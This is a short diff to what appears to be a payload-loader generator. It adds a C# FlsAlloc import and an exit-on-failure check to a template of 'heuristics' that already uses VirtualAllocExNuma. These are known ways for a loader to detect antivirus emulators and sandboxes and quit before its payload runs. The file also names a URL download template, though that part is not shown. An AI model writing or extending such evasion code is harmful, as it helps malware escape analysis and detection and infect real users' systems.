@@ -65,7 +65,8 @@ HEURISTICS_IMPORT = """
     static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr GetCurrentProcess();
-
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern UInt32 FlsAlloc(IntPtr callback);
 """
 
 HEURISTICS_CODE = """
@@ -77,6 +78,12 @@ HEURISTICS_CODE = """
     IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
     if (mem == null)
     { return; }
+
+    UInt32 Fls = FlsAlloc(IntPtr.Zero);
+    if (Fls == 0xFFFFFFFF)
+    {
+        return;
+    }
 """
 
 URL_DL_CODE = """
